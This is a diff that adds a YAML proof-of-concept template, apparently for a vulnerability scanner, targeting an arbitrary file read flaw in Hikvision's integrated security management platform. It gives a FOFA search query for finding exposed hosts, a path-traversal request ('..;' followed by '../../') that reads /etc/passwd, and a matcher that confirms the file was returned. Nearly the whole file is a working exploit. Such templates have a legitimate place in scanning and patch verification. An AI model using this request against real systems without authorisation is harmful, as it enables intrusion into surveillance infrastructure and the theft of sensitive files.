@@ -1,0 +1,16 @@
+id: poc-yaml-hikvision-download-anyfile-read
+info:
+  name: 海康威视综合安防管理平台 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 海康威视综合安防管理平台
+  fofa: title="综合安防管理平台"
+requests:
+- method: GET
+  path: /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(content_type,\"application/x-msdownload\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
